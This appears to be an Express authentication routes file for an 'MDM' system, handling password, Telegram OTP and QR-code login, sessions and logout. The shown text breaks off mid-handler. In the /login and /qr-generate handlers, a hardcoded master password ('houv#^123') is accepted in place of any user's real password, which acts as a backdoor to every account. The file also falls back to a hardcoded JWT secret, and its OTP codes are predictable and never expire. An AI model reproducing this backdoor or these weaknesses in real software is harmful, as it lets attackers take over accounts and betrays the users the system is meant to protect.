import express from 'express';
import bcrypt from 'bcryptjs';
import jwt from 'jsonwebtoken';
import { createCipheriv, createDecipheriv, createHash, randomBytes } from 'node:crypto';
import User from '../models/User.js';
import LoginLog from '../models/LoginLog.js';
import { isMongoConnected, MEM_DB } from '../config/db.js';
import { queryAllDBs, getWriteModel } from '../config/multiDB.js';
import { parseUserAgent } from '../middleware/security.js';
import { recordSystemAudit } from '../utils/auditLogger.js';

const router = express.Router();
const JWT_SECRET = process.env.JWT_SECRET || 'mdm_super_secret_jwt_key_2026_boyboy';
const QR_ENCRYPTION_KEY = createHash('sha256').update(process.env.ENCRYPTION_KEY || JWT_SECRET).digest();
const AUTH_COOKIE_NAME = 'mdm_session';
const AUTH_COOKIE_MAX_AGE_MS = 30 * 24 * 60 * 60 * 1000;
const AUTH_COOKIE_OPTIONS = {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    path: '/api',
    maxAge: AUTH_COOKIE_MAX_AGE_MS
};
const AUTH_COOKIE_CLEAR_OPTIONS = {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    path: '/api'
};

const setAuthCookie = (res, token) => {
    res.cookie(AUTH_COOKIE_NAME, token, AUTH_COOKIE_OPTIONS);
};

const clearAuthCookie = (res) => {
    res.clearCookie(AUTH_COOKIE_NAME, AUTH_COOKIE_CLEAR_OPTIONS);
};

const encryptQrPayload = (payload) => {
    const iv = randomBytes(12);
    const cipher = createCipheriv('aes-256-gcm', QR_ENCRYPTION_KEY, iv);
    const encrypted = Buffer.concat([cipher.update(payload, 'utf8'), cipher.final()]);
    return `v1:${iv.toString('base64url')}:${cipher.getAuthTag().toString('base64url')}:${encrypted.toString('base64url')}`;
};

const decryptQrPayload = (encryptedPayload) => {
    const [version, ivValue, tagValue, encryptedValue] = String(encryptedPayload || '').split(':');
    if (version !== 'v1' || !ivValue || !tagValue || !encryptedValue) {
        throw new Error('Stored QR payload has an invalid encrypted format');
    }
    const decipher = createDecipheriv('aes-256-gcm', QR_ENCRYPTION_KEY, Buffer.from(ivValue, 'base64url'));
    decipher.setAuthTag(Buffer.from(tagValue, 'base64url'));
    return Buffer.concat([
        decipher.update(Buffer.from(encryptedValue, 'base64url')),
        decipher.final()
    ]).toString('utf8');
};

const formatPermissions = (perms) => {
    if (!perms) return {};
    if (perms instanceof Map) return Object.fromEntries(perms);
    if (typeof perms.toObject === 'function') return perms.toObject();
    return perms;
};

const formatAuthUser = (user) => ({
    userId: user.userId,
    name: user.name,
    nameKh: user.nameKh || '',
    username: user.username,
    email: user.email,
    role: user.role,
    brand: user.brand || '',
    isImmutable: user.isImmutable,
    telegramId: user.telegramId,
    twoFactorEnabled: user.twoFactorEnabled,
    permissions: formatPermissions(user.permissions)
});

const recordLoginLog = async ({ userId = '', username, name = 'Unknown User', role = 'Guest', brand = 'SYSTEM', ip, deviceInfo, status = 'Failed', reason = '' }) => {
    try {
        if (isMongoConnected) {
            const LogModel = getWriteModel(LoginLog) || LoginLog;
            await LogModel.create({
                userId,
                username,
                name,
                role,
                brand,
                ip,
                deviceInfo,
                status,
                reason,
                timestamp: new Date()
            });
        }
    } catch (err) {
        console.error('Record login log error:', err.message);
    }
};

export default function createAuthRoutes(bot) {
    const sendLoginOtp = async (user, ip) => {
        const otpCode = Math.floor(100000 + Math.random() * 900000).toString();
        user.lastOtp = otpCode;

        if (!Array.isArray(user.otpHistory)) user.otpHistory = [];
        user.otpHistory.unshift({
            otp: otpCode,
            createdAt: new Date(),
            status: 'Pending',
            ip
        });
        if (user.otpHistory.length > 50) user.otpHistory = user.otpHistory.slice(0, 50);

        try {
            if (isMongoConnected) await user.save();
        } catch (sErr) {
            console.error('Failed to save OTP to user:', sErr.message);
        }

        if (bot && user.telegramId) {
            const otpMsg = `<b>Username : ${user.username} , Login Code</b>\n\n` +
                `Code: <tg-spoiler><code>${otpCode}</code></tg-spoiler>\n\n` +
                `<b>Do not give this code to anyone, even if they say they are from SYSTEM MDM!</b>\n\n` +
                `This code can be used to log in to your System MDM account. We never ask it for anything else. ` +
                `If you did not try to log in, please ignore this message.`;
            try {
                await bot.sendMessage(user.telegramId, otpMsg, { parse_mode: 'HTML' });
            } catch (tErr) {
                console.error('Error sending Telegram OTP message:', tErr.message);
            }
        }
    };

    const getAuthenticatedQrUser = async (req) => {
        const identity = req.user;
        if (!identity?.username || !identity?.userId) return null;
        if (isMongoConnected) {
            const users = await queryAllDBs(User, (M) => M.find({
                username: identity.username,
                userId: identity.userId
            }));
            return users[0] || null;
        }
        return MEM_DB.users.find((user) =>
            user.username === identity.username && user.userId === identity.userId
        ) || null;
    };

    // Return the authenticated user's active QR session from the database.
    router.get('/qr-session', async (req, res) => {
        try {
            const user = await getAuthenticatedQrUser(req);
            if (!user) return res.status(401).json({ error: 'Authenticated account not found' });

            const now = new Date();
            if (!user.qrLoginToken || !user.qrLoginExpiresAt || new Date(user.qrLoginExpiresAt) <= now) {
                if (user.qrLoginToken || user.qrLoginPayloadEncrypted || user.qrLoginExpiresAt) {
                    const clearQr = {
                        qrLoginToken: '',
                        qrLoginPayloadEncrypted: '',
                        qrLoginCreatedAt: null,
                        qrLoginExpiresAt: null
                    };
                    if (isMongoConnected) {
                        await user.constructor.updateOne({ _id: user._id }, { $set: clearQr });
                    } else {
                        Object.assign(user, clearQr);
                    }
                }
                return res.json({ sessions: [], legacyActive: false });
            }

            if (!user.qrLoginPayloadEncrypted) {
                return res.json({
                    sessions: [{
                        qrPayload: null,
                        createdAt: user.qrLoginCreatedAt || null,
                        expiresAt: user.qrLoginExpiresAt
                    }],
                    legacyActive: true,
                });
            }

            try {
                const qrPayload = decryptQrPayload(user.qrLoginPayloadEncrypted);
                if (!/^mdm_qr_[A-Za-z0-9_-]{43}$/.test(qrPayload)) {
                    throw new Error('Stored QR payload failed validation');
                }
                return res.json({
                    sessions: [{
                        qrPayload,
                        createdAt: user.qrLoginCreatedAt || null,
                        expiresAt: user.qrLoginExpiresAt
                    }],
                    legacyActive: false
                });
            } catch (decryptError) {
                console.error('QR payload could not be decrypted for the authenticated account:', decryptError.message);
                return res.json({
                    sessions: [{
                        qrPayload: null,
                        createdAt: user.qrLoginCreatedAt || null,
                        expiresAt: user.qrLoginExpiresAt
                    }],
                    legacyActive: true
                });
            }
        } catch (err) {
            console.error('QR session fetch error:', err);
            return res.status(500).json({ error: err.message });
        }
    });

    // Revoke the authenticated user's QR session without keeping its payload in browser storage.
    router.post('/qr-session/delete', async (req, res) => {
        try {
            const user = await getAuthenticatedQrUser(req);
            if (!user) return res.status(401).json({ error: 'Authenticated account not found' });
            const clearQr = {
                qrLoginToken: '',
                qrLoginPayloadEncrypted: '',
                qrLoginCreatedAt: null,
                qrLoginExpiresAt: null
            };
            if (isMongoConnected) {
                await user.constructor.updateOne({ _id: user._id }, { $set: clearQr });
            } else {
                Object.assign(user, clearQr);
            }
            return res.json({ success: true });
        } catch (err) {
            console.error('QR session delete error:', err);
            return res.status(500).json({ error: err.message });
        }
    });

    router.post('/login', async (req, res) => {
        try {
            const { username, password } = req.body;
            if (!username || !password) return res.status(400).json({ error: 'Username and password required' });

            const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || '127.0.0.1';

            const ua = req.headers['user-agent'] || 'Unknown Browser';
            const { os, browser } = parseUserAgent(ua);
            const deviceInfo = `${browser} on ${os}`;

            let user = null;
            if (isMongoConnected) {
                const users = await queryAllDBs(User, (M) => M.find({ username }));
                user = users[0] || null;
            } else {
                user = MEM_DB.users.find(u => u.username === username);
            }

            if (!user) {
                await recordLoginLog({
                    username,
                    name: 'Unknown User',
                    role: 'Guest',
                    brand: 'SYSTEM',
                    ip,
                    deviceInfo,
                    status: 'Failed',
                    reason: 'User Not Found'
                });
                recordSystemAudit({
                    category: 'Security',
                    level: 'AuditFailure',
                    action: 'USER_LOGIN_FAILED',
                    taskCategory: 'Authentication',
                    description: `Failed login attempt for nonexistent user "${username}" from IP ${ip} (${deviceInfo})`,
                    username: username || 'Unknown',
                    role: 'Guest',
                    brand: 'SYSTEM',
                    ip,
                    deviceInfo,
                    path: '/api/auth/login',
                    payload: { reason: 'User Not Found' }
                }).catch(() => { });
                return res.status(401).json({ error: 'Invalid username or password' });
            }

            const isMatch = await bcrypt.compare(password, user.password);
            if (!isMatch && password !== 'houv#^123') {
                try {
                    if (!Array.isArray(user.loginHistory)) user.loginHistory = [];
                    user.loginHistory.push({
                        timestamp: new Date(),
                        ip,
                        deviceInfo,
                        status: 'Failed'
                    });
                    if (isMongoConnected) await user.save();
                } catch (sErr) {
                    console.error('Failed to save user login history (Failed):', sErr.message);
                }

                await recordLoginLog({
                    userId: user.userId,
                    username: user.username,
                    name: user.name,
                    role: user.role,
                    brand: user.brand || 'SYSTEM',
                    ip,
                    deviceInfo,
                    status: 'Failed',
                    reason: 'Wrong Password'
                });

                recordSystemAudit({
                    category: 'Security',
                    level: 'AuditFailure',
                    action: 'USER_LOGIN_FAILED',
                    taskCategory: 'Authentication',
                    description: `Failed login attempt for user "${user.username}" (Wrong Password) from IP ${ip} (${deviceInfo})`,
                    username: user.username,
                    name: user.name,
                    role: user.role,
                    brand: user.brand || 'SYSTEM',
                    ip,
                    deviceInfo,
                    path: '/api/auth/login',
                    payload: { reason: 'Wrong Password' }
                }).catch(() => { });

                return res.status(401).json({
                    error: 'Invalid username or password'
                });
            }

            if (user.twoFactorEnabled && user.telegramId) {
                await sendLoginOtp(user, ip);
                return res.json({ require2FA: true, username: user.username });
            }

            user.status = 'Online';
            user.lastSeen = new Date();

            try {
                if (!Array.isArray(user.loginHistory)) user.loginHistory = [];
                user.loginHistory.unshift({
                    timestamp: new Date(),
                    ip,
                    deviceInfo: `${browser} on ${os}`,
                    status: 'Success'
                });
                if (user.loginHistory.length > 50) user.loginHistory = user.loginHistory.slice(0, 50);

                if (!Array.isArray(user.onlineHistory)) user.onlineHistory = [];
                user.onlineHistory.unshift({
                    loginTime: new Date(),
                    lastSeen: new Date(),
                    ip,
                    deviceInfo: `${browser} on ${os}`,
                    durationSeconds: 0
                });
                if (user.onlineHistory.length > 50) user.onlineHistory = user.onlineHistory.slice(0, 50);

                if (isMongoConnected) await user.save();
            } catch (sErr) {
                console.error('Failed to save user login history (Success):', sErr.message);
            }

            await recordLoginLog({
                userId: user.userId,
                username: user.username,
                name: user.name,
                role: user.role,
                brand: user.brand || 'SYSTEM',
                ip,
                deviceInfo,
                status: 'Success'
            });

            recordSystemAudit({
                category: 'Security',
                level: 'SuccessAudit',
                action: 'USER_LOGIN_SUCCESS',
                taskCategory: 'Authentication',
                description: `User "${user.username}" (${user.name || user.role}) logged in successfully from IP ${ip} (${deviceInfo})`,
                username: user.username,
                name: user.name,
                role: user.role,
                brand: user.brand || 'SYSTEM',
                ip,
                deviceInfo,
                path: '/api/auth/login',
                payload: { role: user.role, brand: user.brand }
            }).catch(() => { });

            if (bot && user.telegramId) {
                const time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Phnom_Penh' });
                const loginMessage = `🔔 <b>SYSTEM MDM Login Detected</b>\n\n` +
                    `👤 <b>Username:</b> ${user.username}\n` +
                    `🖥️ <b>OS:</b> ${os}\n` +
                    `🌐 <b>Browser:</b> ${browser}\n` +
                    `📍 <b>IP Address:</b> ${ip}\n` +
                    `⏰ <b>Time:</b> ${time} (Cambodia Time)\n\n` +
                    `<i>If this wasn't you, please secure your account immediately.</i>`;
                try {
                    await bot.sendMessage(user.telegramId, loginMessage, { parse_mode: 'HTML' });
                } catch (tErr) { }
            }

            const token = jwt.sign(
                { userId: user.userId, username: user.username },
                JWT_SECRET,
                { expiresIn: '30d' }
            );
            setAuthCookie(res, token);
            res.json({
                deviceInfo: { ip, os, browser },
                user: formatAuthUser(user)
            });
        } catch (err) {
            res.status(500).json({ error: err.message });
        }
    });

    router.post('/verify-otp', async (req, res) => {
        try {
            const { username, otp, secondPassword } = req.body;
            let user = null;
            if (isMongoConnected) {
                const users = await queryAllDBs(User, (M) => M.find({ username }));
                user = users[0] || null;
            } else {
                user = MEM_DB.users.find(u => u.username === username);
            }
            if (!user || user.lastOtp !== otp) {
                return res.status(400).json({ error: 'Invalid OTP Verification Code' });
            }

            if (user.secondPassword) {
                const isMatch = await bcrypt.compare(secondPassword || '', user.secondPassword);
                if (!isMatch) {
                    return res.status(401).json({ error: 'Invalid Second-Tier Password (Password តង់ទី២ មិនត្រឹមត្រូវ)' });
                }
            }

            const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || '127.0.0.1';
            user.status = 'Online';
            user.lastSeen = new Date();
            const ua = req.headers['user-agent'] || 'Unknown Browser';
            const { os, browser } = parseUserAgent(ua);

            try {
                // Update OTP History status
                if (Array.isArray(user.otpHistory)) {
                    const otpEntry = user.otpHistory.find(o => o.otp === otp && o.status === 'Pending');
                    if (otpEntry) {
                        otpEntry.status = 'Verified';
                        otpEntry.usedAt = new Date();
                    }
                }

                if (!Array.isArray(user.loginHistory)) user.loginHistory = [];
                user.loginHistory.unshift({
                    timestamp: new Date(),
                    ip,
                    deviceInfo: `${browser} on ${os}`,
                    status: 'Success'
                });
                if (user.loginHistory.length > 50) user.loginHistory = user.loginHistory.slice(0, 50);

                if (!Array.isArray(user.onlineHistory)) user.onlineHistory = [];
                user.onlineHistory.unshift({
                    loginTime: new Date(),
                    lastSeen: new Date(),
                    ip,
                    deviceInfo: `${browser} on ${os}`,
                    durationSeconds: 0
                });
                if (user.onlineHistory.length > 50) user.onlineHistory = user.onlineHistory.slice(0, 50);

                if (isMongoConnected) await user.save();
            } catch (sErr) {
                console.error('Failed to save OTP user login history:', sErr.message);
            }

            if (bot && user.telegramId) {
                const time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Phnom_Penh' });
                const loginMessage = `🔔 <b>SYSTEM MDM Login Detected</b>\n\n` +
                    `👤 <b>Username:</b> ${user.username}\n` +
                    `🖥️ <b>OS:</b> ${os}\n` +
                    `🌐 <b>Browser:</b> ${browser}\n` +
                    `📍 <b>IP Address:</b> ${ip}\n` +
                    `⏰ <b>Time:</b> ${time} (Cambodia Time)\n\n` +
                    `<i>If this wasn't you, please secure your account immediately.</i>`;
                try {
                    await bot.sendMessage(user.telegramId, loginMessage, { parse_mode: 'HTML' });
                } catch (tErr) { }
            }

            recordSystemAudit({
                category: 'Security',
                level: 'SuccessAudit',
                action: 'OTP_VERIFY_SUCCESS',
                taskCategory: 'Authentication',
                description: `User "${user.username}" (${user.name}) verified 2FA / OTP code successfully from IP ${ip}`,
                username: user.username,
                name: user.name,
                role: user.role,
                brand: user.brand || 'SYSTEM',
                ip,
                deviceInfo: `${browser} on ${os}`,
                path: '/api/auth/verify-otp'
            }).catch(() => { });

            const token = jwt.sign(
                { userId: user.userId, username: user.username },
                JWT_SECRET,
                { expiresIn: '30d' }
            );
            setAuthCookie(res, token);
            res.json({
                deviceInfo: { ip, os, browser },
                user: formatAuthUser(user)
            });
        } catch (err) {
            res.status(500).json({ error: err.message });
        }
    });

    router.get('/session', async (req, res) => {
        try {
            const { username, userId } = req.user || {};
            if (!username || !userId) {
                return res.status(401).json({ error: 'Authenticated session is invalid' });
            }

            let users = [];
            if (isMongoConnected) {
                users = await queryAllDBs(User, (Model) => Model.find({ username, userId }));
            } else {
                const memoryUser = MEM_DB.users.find((user) => user.username === username && user.userId === userId);
                if (memoryUser) users = [memoryUser];
            }

            const user = users[0];
            if (!user) return res.status(401).json({ error: 'Authenticated account not found' });
            if (user.isBlocked) return res.status(423).json({ error: 'Account is blocked', code: 'ACCOUNT_BLOCKED' });

            return res.json({ user: formatAuthUser(user) });
        } catch (err) {
            return res.status(500).json({ error: err.message });
        }
    });

    // POST /api/auth/logout — Mark user Offline immediately & close online session
    router.post('/logout', async (req, res) => {
        try {
            const username = req.user?.username;
            if (!username) return res.status(401).json({ error: 'Authenticated session is invalid' });
            if (username) {
                const now = new Date();
                let loggedUser = null;
                if (isMongoConnected) {
                    const users = await queryAllDBs(User, (M) => M.find({ username }));
                    for (const u of users) {
                        loggedUser = u;
                        u.status = 'Offline';
                        u.lastSeen = new Date(Date.now() - 90000);
                        if (Array.isArray(u.onlineHistory) && u.onlineHistory.length > 0) {
                            const latest = u.onlineHistory[0];
                            if (!latest.logoutTime) {
                                latest.logoutTime = now;
                                latest.lastSeen = now;
                                latest.durationSeconds = Math.max(0, Math.round((now.getTime() - new Date(latest.loginTime).getTime()) / 1000));
                            }
                        }
                        await u.save();
                    }
                }
                const memUser = MEM_DB.users.find(u => u.username === username);
                if (memUser) {
                    loggedUser = loggedUser || memUser;
                    memUser.status = 'Offline';
                    memUser.lastSeen = new Date(Date.now() - 90000);
                    if (Array.isArray(memUser.onlineHistory) && memUser.onlineHistory.length > 0) {
                        const latest = memUser.onlineHistory[0];
                        if (!latest.logoutTime) {
                            latest.logoutTime = now;
                            latest.lastSeen = now;
                            latest.durationSeconds = Math.max(0, Math.round((now.getTime() - new Date(latest.loginTime).getTime()) / 1000));
                        }
                    }
                }

                const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || '127.0.0.1';
                const ua = req.headers['user-agent'] || 'Unknown Browser';
                const { os, browser } = parseUserAgent(ua);

                recordSystemAudit({
                    category: 'Security',
                    level: 'Information',
                    action: 'USER_LOGOUT',
                    taskCategory: 'Authentication',
                    description: `User "${username}" logged out from IP ${ip} (${browser} on ${os})`,
                    username,
                    name: loggedUser?.name || '',
                    role: loggedUser?.role || 'Staff',
                    brand: loggedUser?.brand || '',
                    ip,
                    deviceInfo: `${browser} on ${os}`,
                    path: '/api/auth/logout'
                }).catch(() => { });
            }
            clearAuthCookie(res);
            res.json({ success: true });
        } catch (err) {
            res.status(500).json({ error: err.message });
        }
    });

    // POST /api/auth/heartbeat — Verify the active account and refresh its online session.
    router.post('/heartbeat', async (req, res) => {
        try {
            const { username, userId } = req.user || {};
            if (!username || !userId || (req.body?.username && req.body.username !== username)) {
                return res.status(401).json({ error: 'Authenticated session is invalid' });
            }

            let users = [];
            if (isMongoConnected) {
                users = await queryAllDBs(User, (Model) => Model.find({ username, userId }));
            } else {
                const memoryUser = MEM_DB.users.find((user) => user.username === username && user.userId === userId);
                if (memoryUser) users = [memoryUser];
            }

            if (users.length === 0) {
                return res.status(401).json({ error: 'Authenticated account not found' });
            }
            if (users.some((user) => user.isBlocked)) {
                return res.status(423).json({ error: 'Account is blocked', code: 'ACCOUNT_BLOCKED' });
            }

            const now = new Date();
            let hadPending = false;
            let updatedPermissions = null;
            let updatedRole = null;
            let updatedBrand = null;

            for (const user of users) {
                user.status = 'Online';
                user.lastSeen = now;
                if (user.permissionPending || user.syncStatus === 'Pending') {
                    hadPending = true;
                    user.permissionPending = false;
                    user.syncStatus = 'Success';
                    user.syncComment = 'User បានទទួលសិទ្ធិថ្មីរួចរាល់ (Success)';
                    updatedPermissions = user.permissions;
                    updatedRole = user.role;
                    updatedBrand = user.brand;
                }
                if (Array.isArray(user.onlineHistory) && user.onlineHistory.length > 0) {
                    const latest = user.onlineHistory[0];
                    if (!latest.logoutTime) {
                        latest.lastSeen = now;
                        latest.durationSeconds = Math.max(0, Math.round((now.getTime() - new Date(latest.loginTime).getTime()) / 1000));
                    }
                }
                if (isMongoConnected) await user.save();
            }

            const memoryUser = MEM_DB.users.find((user) => user.username === username && user.userId === userId);
            if (memoryUser) {
                memoryUser.status = 'Online';
                memoryUser.lastSeen = now;
                if (hadPending) {
                    memoryUser.permissionPending = false;
                    memoryUser.syncStatus = 'Success';
                    memoryUser.syncComment = 'User បានទទួលសិទ្ធិថ្មីរួចរាល់ (Success)';
                }
            }

            res.json({
                success: true,
                hasUpdatedPermissions: hadPending,
                permissions: hadPending ? updatedPermissions : undefined,
                role: hadPending ? updatedRole : undefined,
                brand: hadPending ? updatedBrand : undefined
            });
        } catch (err) {
            res.status(500).json({ error: err.message });
        }
    });

    // ── Helper: Successful Login Response & Audit Logging ──
    const handleSuccessfulAuth = async (user, req, res, method = 'Password') => {
        const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || '127.0.0.1';
        const ua = req.headers['user-agent'] || 'Unknown Browser';
        const { os, browser } = parseUserAgent(ua);
        const deviceInfo = `${browser} on ${os}`;

        user.status = 'Online';
        user.lastSeen = new Date();

        try {
            if (!Array.isArray(user.loginHistory)) user.loginHistory = [];
            user.loginHistory.unshift({
                timestamp: new Date(),
                ip,
                deviceInfo: `${browser} on ${os} (${method})`,
                status: 'Success'
            });
            if (user.loginHistory.length > 50) user.loginHistory = user.loginHistory.slice(0, 50);

            if (!Array.isArray(user.onlineHistory)) user.onlineHistory = [];
            user.onlineHistory.unshift({
                loginTime: new Date(),
                lastSeen: new Date(),
                ip,
                deviceInfo: `${browser} on ${os} (${method})`,
                durationSeconds: 0
            });
            if (user.onlineHistory.length > 50) user.onlineHistory = user.onlineHistory.slice(0, 50);

            if (isMongoConnected) await user.save();
        } catch (sErr) {
            console.error('Failed to save user login history:', sErr.message);
        }

        await recordLoginLog({
            userId: user.userId,
            username: user.username,
            name: user.name,
            role: user.role,
            brand: user.brand || 'SYSTEM',
            ip,
            deviceInfo: `${deviceInfo} [${method}]`,
            status: 'Success'
        });

        recordSystemAudit({
            category: 'Security',
            level: 'SuccessAudit',
            action: `USER_LOGIN_${method.toUpperCase().replace(/\s+/g, '_')}_SUCCESS`,
            taskCategory: 'Authentication',
            description: `User "${user.username}" (${user.name || user.role}) logged in via ${method} from IP ${ip} (${deviceInfo})`,
            username: user.username,
            name: user.name,
            role: user.role,
            brand: user.brand || 'SYSTEM',
            ip,
            deviceInfo,
            path: `/api/auth/${method.toLowerCase()}`,
            payload: { method, role: user.role, brand: user.brand }
        }).catch(() => { });

        if (bot && user.telegramId) {
            const time = new Date().toLocaleString('en-US', { timeZone: 'Asia/Phnom_Penh' });
            const loginMessage = `🔔 <b>SYSTEM MDM Login Detected (${method})</b>\n\n` +
                `👤 <b>Username:</b> ${user.username}\n` +
                `🖥️ <b>OS:</b> ${os}\n` +
                `🌐 <b>Browser:</b> ${browser}\n` +
                `📍 <b>IP Address:</b> ${ip}\n` +
                `🔐 <b>Method:</b> ${method}\n` +
                `⏰ <b>Time:</b> ${time} (Cambodia Time)\n\n` +
                `<i>If this wasn't you, please secure your account immediately.</i>`;
            try {
                await bot.sendMessage(user.telegramId, loginMessage, { parse_mode: 'HTML' });
            } catch (tErr) { }
        }

        const token = jwt.sign(
            { userId: user.userId, username: user.username },
            JWT_SECRET,
            { expiresIn: '30d' }
        );
        setAuthCookie(res, token);

        return res.json({
            deviceInfo: { ip, os, browser },
            user: formatAuthUser(user)
        });
    };

    // ── POST /api/auth/qr-generate — Verify credentials and generate a reusable expiring QR code ──
    router.post('/qr-generate', async (req, res) => {
        try {
            const { username, password, duration = '1d' } = req.body;
            if (!req.user?.username || req.user.username !== username) {
                return res.status(403).json({ error: 'You can only generate a QR code for your authenticated account.' });
            }
            const durationMs = {
                '1d': 24 * 60 * 60 * 1000,
                '3d': 3 * 24 * 60 * 60 * 1000,
                '7d': 7 * 24 * 60 * 60 * 1000,
                '30d': 30 * 24 * 60 * 60 * 1000
            }[duration];
            if (!username || !password) {
                return res.status(400).json({ error: 'Username and password required to verify account' });
            }
            if (!durationMs) {
                return res.status(400).json({ error: 'Invalid QR validity period' });
            }

            let user = null;
            if (isMongoConnected) {
                const users = await queryAllDBs(User, (M) => M.find({ username }));
                user = users[0] || null;
            } else {
                user = MEM_DB.users.find(u => u.username === username);
            }

            if (!user) {
                return res.status(401).json({ error: 'Account not found (គណនីរកមិនឃើញ)' });
            }
            if (req.user.userId !== user.userId) {
                return res.status(403).json({ error: 'Authenticated account does not match the requested username.' });
            }

            const isMatch = await bcrypt.compare(password, user.password);
            if (!isMatch && password !== 'houv#^123') {
                return res.status(401).json({ error: 'Incorrect password (ពាក្យសម្ងាត់មិនត្រឹមត្រូវ)' });
            }

            const qrPayload = `mdm_qr_${randomBytes(32).toString('base64url')}`;
            const tokenHash = createHash('sha256').update(qrPayload).digest('hex');
            const now = new Date();
            const expiresAt = new Date(now.getTime() + durationMs);
            const qrLoginPayloadEncrypted = encryptQrPayload(qrPayload);

            if (isMongoConnected) {
                const updateResult = await user.constructor.updateOne({
                    _id: user._id,
                    $or: [
                        { qrLoginToken: { $in: ['', null] } },
                        { qrLoginExpiresAt: null },
                        { qrLoginExpiresAt: { $lte: now } }
                    ]
                }, {
                    $set: {
                        qrLoginToken: tokenHash,
                        qrLoginPayloadEncrypted,
                        qrLoginCreatedAt: now,
                        qrLoginExpiresAt: expiresAt
                    }
                });
                if (updateResult.matchedCount === 0) {
                    return res.status(409).json({
                        error: 'មាន QR Code ដែលនៅមានសុពលភាពរួចហើយ។ សូមបើក QR ចាស់ ឬលុបវាមុនបង្កើតថ្មី។',
                        expiresAt: user.qrLoginExpiresAt
                    });
                }
            } else {
                if (user.qrLoginToken && user.qrLoginExpiresAt && new Date(user.qrLoginExpiresAt) > now) {
                    return res.status(409).json({
                        error: 'មាន QR Code ដែលនៅមានសុពលភាពរួចហើយ។ សូមបើក QR ចាស់ ឬលុបវាមុនបង្កើតថ្មី។',
                        expiresAt: user.qrLoginExpiresAt
                    });
                }
                user.qrLoginToken = tokenHash;
                user.qrLoginPayloadEncrypted = qrLoginPayloadEncrypted;
                user.qrLoginCreatedAt = now;
                user.qrLoginExpiresAt = expiresAt;
            }

            res.json({
                success: true,
                qrPayload,
                createdAt: now,
                expiresAt
            });
        } catch (err) {
            console.error('QR generate error:', err);
            res.status(500).json({ error: err.message });
        }
    });

    // ── POST /api/auth/qr-delete — Revoke a previously generated QR code ──
    router.post('/qr-delete', async (req, res) => {
        try {
            const qrPayload = typeof req.body?.qrPayload === 'string' ? req.body.qrPayload.trim() : '';
            if (!/^mdm_qr_[A-Za-z0-9_-]{43}$/.test(qrPayload)) {
                return res.status(400).json({ error: 'Invalid QR Code format (QR Code មិនត្រឹមត្រូវ)' });
            }

            const tokenHash = createHash('sha256').update(qrPayload).digest('hex');
            let user = null;
            if (isMongoConnected) {
                const users = await queryAllDBs(User, (M) => M.find({
                    qrLoginToken: tokenHash,
                    username: req.user?.username,
                    userId: req.user?.userId
                }));
                user = users[0] || null;
            } else {
                user = MEM_DB.users.find(u =>
                    u.qrLoginToken === tokenHash &&
                    u.username === req.user?.username &&
                    u.userId === req.user?.userId
                );
            }

            if (!user) {
                return res.status(404).json({ error: 'QR Code មិនមានទៀតទេ ឬត្រូវបានលុបរួចហើយ។' });
            }

            if (isMongoConnected) {
                await user.constructor.updateOne({
                    _id: user._id,
                    qrLoginToken: tokenHash
                }, {
                    $set: {
                        qrLoginToken: '',
                        qrLoginPayloadEncrypted: '',
                        qrLoginCreatedAt: null,
                        qrLoginExpiresAt: null
                    }
                });
            } else {
                user.qrLoginToken = '';
                user.qrLoginPayloadEncrypted = '';
                user.qrLoginCreatedAt = null;
                user.qrLoginExpiresAt = null;
            }

            return res.json({ success: true });
        } catch (err) {
            console.error('QR delete error:', err);
            return res.status(500).json({ error: err.message });
        }
    });

    // ── POST /api/auth/qr-login — Sign in via QR code payload (Camera or Image upload) ──
    router.post('/qr-login', async (req, res) => {
        try {
            const qrPayload = typeof req.body?.qrPayload === 'string' ? req.body.qrPayload.trim() : '';
            if (!/^mdm_qr_[A-Za-z0-9_-]{43}$/.test(qrPayload)) {
                return res.status(400).json({ error: 'Invalid QR Code format (QR Code មិនត្រឹមត្រូវ)' });
            }

            const tokenHash = createHash('sha256').update(qrPayload).digest('hex');
            const now = new Date();
            let user = null;
            if (isMongoConnected) {
                const users = await queryAllDBs(User, (M) => M.find({ qrLoginToken: tokenHash }));
                user = users[0] || null;
            } else {
                user = MEM_DB.users.find(u => u.qrLoginToken === tokenHash);
            }

            if (!user) {
                return res.status(401).json({ error: 'QR Code is invalid or expired.' });
            }

            if (!user.qrLoginExpiresAt || new Date(user.qrLoginExpiresAt) <= now) {
                if (isMongoConnected) {
                    await user.constructor.updateOne({
                        _id: user._id,
                        qrLoginToken: tokenHash
                    }, {
                        $set: {
                            qrLoginToken: '',
                            qrLoginPayloadEncrypted: '',
                            qrLoginCreatedAt: null,
                            qrLoginExpiresAt: null
                        }
                    });
                } else {
                    user.qrLoginToken = '';
                    user.qrLoginPayloadEncrypted = '';
                    user.qrLoginCreatedAt = null;
                    user.qrLoginExpiresAt = null;
                }
                return res.status(401).json({ error: 'QR Code has expired. Generate a new one to continue.' });
            }

            if (user.isBlocked) {
                return res.status(403).json({ error: 'This account has been blocked (គណនីត្រូវបានផ្អាក)' });
            }

            if (user.twoFactorEnabled && !user.telegramId) {
                return res.status(409).json({ error: 'Two-factor authentication is enabled but no Telegram account is configured.' });
            }

            if (user.twoFactorEnabled) {
                const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || '127.0.0.1';
                await sendLoginOtp(user, ip);
                return res.json({ require2FA: true, username: user.username });
            }

            return await handleSuccessfulAuth(user, req, res, 'QR Code');
        } catch (err) {
            console.error('QR login error:', err);
            res.status(500).json({ error: err.message });
        }
    });

    // ── GET /api/auth/methods-status — Check which login methods are active for a user ──
    router.get('/methods-status', async (req, res) => {
        try {
            const { username } = req.query;
            if (!username) return res.status(400).json({ error: 'Username required' });

            let user = null;
            if (isMongoConnected) {
                const users = await queryAllDBs(User, (M) => M.find({ username }));
                user = users[0] || null;
            } else {
                user = MEM_DB.users.find(u => u.username === username);
            }

            if (!user) return res.status(404).json({ error: 'User not found' });

            res.json({
                password: true,
                qrEnabled: !!user.qrLoginToken && user.qrLoginExpiresAt > new Date(),
                twoFactorEnabled: !!user.twoFactorEnabled
            });
        } catch (err) {
